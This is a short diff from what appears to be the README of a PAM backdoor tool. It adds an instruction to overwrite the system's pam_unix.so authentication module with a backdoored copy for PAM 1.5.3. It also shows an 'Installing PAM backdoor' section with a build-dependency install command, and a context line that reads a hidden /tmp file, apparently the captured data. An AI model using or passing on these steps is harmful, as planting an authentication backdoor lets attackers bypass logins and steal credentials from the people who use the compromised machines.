@@ -34,7 +34,7 @@ localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
 
 # Installing PAM backdoor
 
-
+If your PAM is version 1.5.3 just move pam_unix.so._backdoor_for_PAM.1.5.3_ module file into /lib/x86_64-linux-gnu/security/pam_unix.so (or /usr/lib/security/)
 
 ```bash
 sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc -y
